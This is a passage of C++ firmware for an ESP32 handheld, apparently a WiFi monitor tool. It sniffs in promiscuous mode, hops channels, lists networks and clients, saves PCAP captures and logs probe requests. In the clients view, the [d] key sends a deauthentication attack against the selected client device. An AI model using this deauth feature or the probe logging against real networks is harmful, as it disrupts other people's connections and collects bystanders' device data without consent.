        e.rssi = rssi;
        e.tsMs = tsMs;
    }
}

// ── main loop ─────────────────────────────────────────────────────────────────
void WiFiMonitor::start(int fixedChannel) {
    resetAll();

    WiFi.disconnect(false);
    WiFi.mode(WIFI_STA);

    // open PCAP BEFORE promiscuous — GDMA rule
    // probe log starts OFF — user presses [p] to start
    openPcap();

    // reset filter — prior ws/da sessions set DATA-only which hides beacons
    wifi_promiscuous_filter_t filt = {
        .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
    };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(rxCallback);

    _hopping = (fixedChannel == 0);
    _currentChannel = _hopping ? 1 : fixedChannel;
    setChannel(_currentChannel);

    _dm.clearScreen();
    _dm.setCursor(4, outputY);
    _dm.setTextColor(TFT_GREEN);
    _dm.println("Monitor mode active...");
    _dm.setTextColor(TFT_WHITE);
    vTaskDelay(pdMS_TO_TICKS(500));

    uint32_t lastDraw   = 0;
    uint32_t lastHop    = 0;
    uint32_t lastExpire = 0;
    const uint32_t DRAW_MS    = 300;
    const uint32_t HOP_MS     = 200;
    const uint32_t EXPIRE_MS  = 10000;
    const uint32_t PCAP_FL_MS = 2000;   // flush PCAP ring every 2 s

    while (true) {
        uint32_t now = millis();

        if (_hopping && now - lastHop > HOP_MS) {
            _currentChannel = (_currentChannel % 13) + 1;
            setChannel(_currentChannel);
            lastHop = now;
        }

        if (now - lastExpire > EXPIRE_MS) {
            expireClients(now);
            lastExpire = now;
        }

        // flush PCAP ring every 2s or at 25% full — keeps pause time short
        uint16_t pcapUsed = (s_pcapHead - s_pcapTail + WM_PCAP_RING) % WM_PCAP_RING;
        if (_pcapOpen && (now - _lastPcapFlush > PCAP_FL_MS || pcapUsed >= WM_PCAP_RING/4)) {
            flushPcap();  // also flushes probe log inside same pause window
        }

        // probe log standalone flush (when PCAP is off) — same GDMA pause pattern
        if (_probeOpen && !_pcapOpen && now - _lastProbeFlush > 5000 && _probePendCount > 0) {
            s_pcapActive = false;
            esp_wifi_set_promiscuous(false);
            flushProbeLog();
            _lastProbeFlush = now;
            wifi_promiscuous_filter_t pf = {
                .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
            };
            esp_wifi_set_promiscuous_filter(&pf);
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(rxCallback);
            setChannel(_currentChannel);
        }

        processRing();

        if (now - lastDraw > DRAW_MS) {
            if (_view == VIEW_NETS)    drawNets();
            else                       drawClients();
            lastDraw = now;
        }

        char k = inputHandler.getKeyboardInput();
        TrackballEvent evt = inputHandler.getTrackballEvent();
        if (k == 'q' || k == 'Q') break;

        // view toggle
        if (k == 'v' || k == 'V') {
            _view = (_view == VIEW_NETS) ? VIEW_CLIENTS : VIEW_NETS;
            _page = 0;
            _selClient = -1;
            lastDraw = 0;
        }

        // channel hop toggle (nets view only)
        if (k == 'h' || k == 'H') {
            _hopping = !_hopping;
            if (_hopping) { _currentChannel = 1; lastHop = 0; }
        }

        // probe log toggle
        if (k == 'p' || k == 'P') {
            s_pcapActive = false;
            esp_wifi_set_promiscuous(false);
            if (_probeOpen) {
                closeProbeLog();
                setStatus("Probe log stopped");
            } else {
                openProbeLog();
                if (_probeOpen) {
                    char msg[44];
                    snprintf(msg, sizeof(msg), "Probes -> %s", _probePath);
                    setStatus(msg, 3000);
                } else {
                    setStatus("Probe log: no SD");
                }
            }
            wifi_promiscuous_filter_t f2 = {
                .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
            };
            esp_wifi_set_promiscuous_filter(&f2);
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(rxCallback);
            setChannel(_currentChannel);
            s_pcapActive = _pcapOpen;
        }

        // PCAP toggle
        if (k == 's' || k == 'S') {
            if (_pcapOpen) {
                // stop: flush remaining, close file
                s_pcapActive = false;
                flushPcap();
                closePcap();
                setStatus("PCAP stopped");
            } else {
                // start new PCAP file (must pause promiscuous to open file)
                s_pcapActive = false;
                esp_wifi_set_promiscuous(false);
                openPcap();
                wifi_promiscuous_filter_t f2 = {
                    .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA
                };
                esp_wifi_set_promiscuous_filter(&f2);
                esp_wifi_set_promiscuous(true);
                esp_wifi_set_promiscuous_rx_cb(rxCallback);
                setChannel(_currentChannel);
                char msg[48];
                snprintf(msg, sizeof(msg), "PCAP: %s", _pcapPath);
                setStatus(msg, 3000);
            }
        }

        if (_view == VIEW_NETS) {
            // digit 1-9: lock to channel
            if (k >= '1' && k <= '9') { _hopping = false; setChannel(k - '0'); }
            // '0': cycle channels 10-13
            if (k == '0') {
                _hopping = false;
                int next = (_currentChannel >= 10 && _currentChannel < 13)
                           ? _currentChannel + 1 : 10;
                setChannel(next);
            }
            // trackpad scrolls net list
            if (evt == TBALL_UP && _page > 0) { _page--; lastDraw = 0; }
            if (evt == TBALL_DOWN) {
                int maxPage = (_netCount - 1) / 10;
                if (_page < maxPage) { _page++; lastDraw = 0; }
            }
        } else {
            // CLIENTS view — trackpad moves cursor up/down
            if (evt == TBALL_UP && _clientCount > 0) {
                if (_selClient > 0) {
                    _selClient--;
                    // scroll page up if cursor moved above visible area
                    if (_selClient < _page * 12) _page--;
                }
                lastDraw = 0;
            }
            if (evt == TBALL_DOWN && _clientCount > 0) {
                if (_selClient < _clientCount - 1) {
                    _selClient++;
                    // scroll page down if cursor moved below visible area
                    if (_selClient >= (_page + 1) * 12) _page++;
                }
                lastDraw = 0;
            }

            // [d] deauth the currently selected client
            if ((k == 'd' || k == 'D') && _selClient >= 0 && _selClient < _clientCount) {
                deauthClient(_selClient);
                lastDraw = 0;
            }
        }

        if (LockScreenManager::getInstance().consumeJustUnlocked()) {
            lastDraw = 0;   // force immediate redraw after unlock
        }
    }

    // teardown — promiscuous off before any SD write (GDMA rule)
    s_pcapActive = false;
    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);

    // final PCAP + probe log flush + close (promiscuous already off)
    closePcap();
    closeProbeLog();

    _dm.clearScreen();
    _dm.setCursor(4, outputY);
    _dm.setTextColor(TFT_YELLOW);
    char summary[64];
    snprintf(summary, sizeof(summary), "Monitor off. Pkts:%lu Nets:%d Cli:%d",
             (unsigned long)_totalPkts, _netCount, _clientCount);
    _dm.println(summary);
    if (_pcapFrames > 0) {
        _dm.setTextColor(TFT_GREEN);
        char pcapMsg[52];
        snprintf(pcapMsg, sizeof(pcapMsg), "PCAP: %lu frm -> %s",
                 (unsigned long)_pcapFrames, _pcapPath);
        _dm.println(pcapMsg);
    }
    if (_probeCount > 0) {
        _dm.setTextColor(TFT_CYAN);
        char probeMsg[52];
        snprintf(probeMsg, sizeof(probeMsg), "Probes: %lu unique -> /logs/probes.csv",
                 (unsigned long)_probeCount);
        _dm.println(probeMsg);
    }
    _dm.setTextColor(TFT_WHITE);
    vTaskDelay(pdMS_TO_TICKS(2000));
    _dm.printCommandScreen();
}
